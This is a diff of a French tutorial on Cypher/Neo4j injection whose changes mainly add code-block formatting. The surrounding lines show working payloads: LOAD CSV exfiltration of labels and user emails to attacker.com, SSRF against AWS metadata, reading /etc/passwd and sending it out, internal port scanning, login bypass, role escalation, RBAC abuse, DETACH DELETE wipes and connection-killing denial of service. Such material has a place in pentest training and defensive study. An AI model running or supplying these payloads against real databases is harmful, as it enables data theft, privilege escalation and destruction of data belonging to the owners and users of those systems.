@@ -18,7 +18,7 @@ SQL : Bases de données relationnelles :: Cypher : Bases de données graphiques
 
 Les bases de données traditionnelles excellent pour les données tabulaires, mais peinent avec les relations complexes :
 
-```
+```cypher
 ❌ SQL Complexe pour les Relations :
 SELECT u1.nom, u2.nom, u3.nom 
 FROM utilisateurs u1
@@ -581,6 +581,7 @@ payload2 = ' AND EXISTS((u:Utilisateur {role:'superadmin'}))) AND '1'='1
 
 **⏰ Time-Based (Basée sur le Temps)**
 
+{% code fullWidth="true" %}
 ```cypher
 // Nécessite APOC installé
 // Test : Le premier caractère du mot de passe admin est-il 'a' ?
@@ -589,6 +590,7 @@ payload2 = ' AND EXISTS((u:Utilisateur {role:'superadmin'}))) AND '1'='1
 // Si la réponse met 5 secondes → première lettre = 'a'  
 // Si réponse immédiate → première lettre ≠ 'a'
 ```
+{% endcode %}
 
 **📊 Schéma Blind**
 
@@ -781,6 +783,7 @@ MATCH (u) WHERE u.nom = '[INJECTION_ICI]' AND u.actif = true RETURN u
 
 **🛠️ Techniques d'Échappement**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 🔓 Sortir d'une chaîne simple
 Original: MATCH (u) WHERE u.nom = 'USER_INPUT' RETURN u
@@ -797,6 +800,7 @@ Original: CREATE (n:Person) SET n.name="USER_INPUT" RETURN n
 Payload: test" WITH 1337 AS dummy MATCH (n) DETACH DELETE n//
 Final: CREATE (n:Person) SET n.name="test" WITH 1337 AS dummy MATCH (n) DETACH DELETE n//" RETURN n
 ```
+{% endcode %}
 
 **💬 Gestion des Commentaires**
 
@@ -944,6 +948,7 @@ SHOW ROLES YIELD role AS result //
 
 **🌐 Méthodes Out-of-Band**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 📡 Exfiltration LOAD CSV basique
 ' CALL db.labels() YIELD label LOAD CSV FROM 'https://attacker.com/' + label AS r RETURN r //
@@ -957,11 +962,13 @@ SHOW ROLES YIELD role AS result //
 -- 📊 Exfiltration avec encodage (contournement de caractères spéciaux)
 ' MATCH (u:Utilisateur) WITH apoc.text.base64Encode(u.nom + '|' + u.email) AS encoded LOAD CSV FROM 'https://attacker.com/b64/' + encoded AS r RETURN r //
 ```
+{% endcode %}
 
 #### <mark style="color:green;">7.3 Server-Side Request Forgery (SSRF)</mark>
 
 **☁️ Métadonnées Cloud (AWS)**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 🔍 Reconnaissance métadonnées AWS
 ' LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS meta WITH meta[0] AS endpoint LOAD CSV FROM 'https://attacker.com/aws/meta/' + endpoint AS r RETURN r //
@@ -972,9 +979,11 @@ SHOW ROLES YIELD role AS result //
 -- 🏷️ Instance metadata
 ' LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/instance-id' AS instance LOAD CSV FROM 'https://attacker.com/aws/instance/' + instance[0] AS r RETURN r //
 ```
+{% endcode %}
 
 **🔍 Reconnaissance Interne**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 🌐 Scan de ports internes (via timing)
 ' LOAD CSV FROM 'http://192.168.1.1:22' AS r RETURN r //     -- SSH
@@ -988,11 +997,13 @@ SHOW ROLES YIELD role AS result //
 -- 🗂️ Lecture de fichiers via file://
 ' LOAD CSV FROM 'file:///etc/passwd' AS passwd LOAD CSV FROM 'https://attacker.com/files/' + passwd[0] AS r RETURN r //
 ```
+{% endcode %}
 
 #### <mark style="color:green;">7.4 Bypass d'Authentification</mark>
 
 **🔓 Techniques Classiques**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 🎯 Bypass login simple
 Original: MATCH (u:User) WHERE u.username = 'admin' AND u.password = 'USER_INPUT' RETURN u
@@ -1003,6 +1014,7 @@ Final: MATCH (u:User) WHERE u.username = 'admin' AND u.password = '' OR 1=1 RETU
 Original: MATCH (u:User) WHERE u.email = 'USER_EMAIL' AND u.password = 'USER_PASSWORD' RETURN u  
 Payload email: admin@company.com' OR u.role = 'admin' WITH u MATCH (admin:User) WHERE admin.role = 'admin' RETURN admin //
 ```
+{% endcode %}
 
 **🎭 Usurpation d'Identité**
 
@@ -1018,6 +1030,7 @@ Payload email: admin@company.com' OR u.role = 'admin' WITH u MATCH (admin:User) 
 
 **📈 Modification de Rôles**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 🎯 Dans une requête CREATE vulnérable
 Original: CREATE (u:User) SET u.name = 'USER_INPUT', u.role = 'user' RETURN u
@@ -1028,9 +1041,11 @@ Final: CREATE (u:User) SET u.name = "test", u.role = "admin" RETURN u //', u.rol
 Original: CREATE (u:User) SET u.name = 'USER_INPUT' RETURN u
 Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
 ```
+{% endcode %}
 
 **🛡️ Contournement RBAC**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 🔍 Énumération des permissions
 ' UNION CALL dbms.security.listRoles() YIELD role, users RETURN role + ': ' + toString(users) AS result //
@@ -1038,6 +1053,7 @@ Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
 -- 👥 Ajout à un groupe privilégié  
 ' UNION CALL dbms.security.addRoleToUser('admin', 'current_user') YIELD user RETURN user //
 ```
+{% endcode %}
 
 #### <mark style="color:green;">7.6 Techniques Destructives (⚠️ DANGER)</mark>
 
@@ -1066,6 +1082,7 @@ Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
 
 **💀 Déni de Service**
 
+{% code fullWidth="true" %}
 ```cypher
 -- 💣 Requêtes coûteuses (bombes cartésiennes)
 ' MATCH (a)-[*]-(b) RETURN count(*) //
@@ -1076,5 +1093,6 @@ Payload: test" WITH u SET u.role = "admin", u.permissions = ["*"] RETURN u //
 -- 💀 Kill des connexions
 ' CALL dbms.listConnections() YIELD connectionId WITH collect(connectionId) AS connections CALL dbms.killConnections(connections) YIELD connectionId RETURN connectionId //
 ```
+{% endcode %}
 
 ***
